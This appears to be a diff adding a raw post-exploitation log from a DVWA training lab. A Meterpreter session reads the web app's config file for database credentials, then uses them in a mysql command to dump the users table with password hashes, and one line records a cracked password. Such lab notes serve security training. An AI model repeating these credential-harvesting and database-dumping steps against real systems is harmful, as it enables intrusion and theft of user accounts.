@@ -1,0 +1,68 @@
+meterpreter > ls
+Listing: /var/www/html/config
+=============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  1859  fil   2018-10-12 17:44:28 +0000  config.inc.php
+100644/rw-r--r--  1859  fil   2021-01-18 17:04:36 +0000  config.inc.php.bak
+100644/rw-r--r--  1864  fil   2018-10-12 17:44:28 +0000  config.inc.php.dist
+
+meterpreter > cat config.inc.php
+<?php
+
+# If you are having problems connecting to the MySQL database and all of the variables below are correct
+# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
+#   Thanks to @digininja for the fix.
+
+# Database management system to use
+$DBMS = 'MySQL';
+#$DBMS = 'PGSQL'; // Currently disabled
+
+# Database variables
+#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
+#   Please use a database dedicated to DVWA.
+#
+# If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.
+#   See README.md for more information on this.
+$_DVWA = array();
+$_DVWA[ 'db_server' ]   = '127.0.0.1';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ]     = 'app';
+$_DVWA[ 'db_password' ] = 'vulnerables';
+
+# Only used with PostgreSQL/PGSQL database selection.
+$_DVWA[ 'db_port '] = '5432';
+
+# ReCAPTCHA settings
+#   Used for the 'Insecure CAPTCHA' module
+#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin/create
+$_DVWA[ 'recaptcha_public_key' ]  = '';
+$_DVWA[ 'recaptcha_private_key' ] = '';
+
+# Default security level
+#   Default value for the secuirty level with each session.
+#   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
+$_DVWA[ 'default_security_level' ] = 'low';
+
+# Default PHPIDS status
+#   PHPIDS status with each session.
+#   The default is 'disabled'. You can set this to be either 'enabled' or 'disabled'.
+$_DVWA[ 'default_phpids_level' ] = 'disabled';
+
+:# Verbose PHPIDS messages
+#   Enabling this will show why the WAF blocked the request on the blocked request.
+#   The default is 'disabled'. You can set this to be either 'true' or 'false'.
+$_DVWA[ 'default_phpids_verbose' ] = 'false';
+
+?>
+
+echo "select * from dvwa.users;" | mysql -uapp -pvulnerables
+user_id	first_name	last_name	user	password	avatar	last_login	failed_login
+1	admin	admin	admin	5f4dcc3b5aa765d61d8327deb882cf99	/hackable/users/admin.jpg	2021-01-18 17:04:36	0
+2	Gordon	Brown	gordonb	e99a18c428cb38d5f260853678922e03	/hackable/users/gordonb.jpg	2021-01-18 17:04:36	0
+3	Hack	Me	1337	8d3533d75ae2c3966d7e0d4fcc69216b	/hackable/users/1337.jpg	2021-01-18 17:04:36	0
+4	Pablo	Picasso	pablo	0d107d09f5bbe40cade3de5c71e9e9b7	/hackable/users/pablo.jpg	2021-01-18 17:04:36	0
+5	Bob	Smith	smithy	5f4dcc3b5aa765d61d8327deb882cf99	/hackable/users/smithy.jpg	2021-01-18 17:04:36	0
+
+1337 = charley
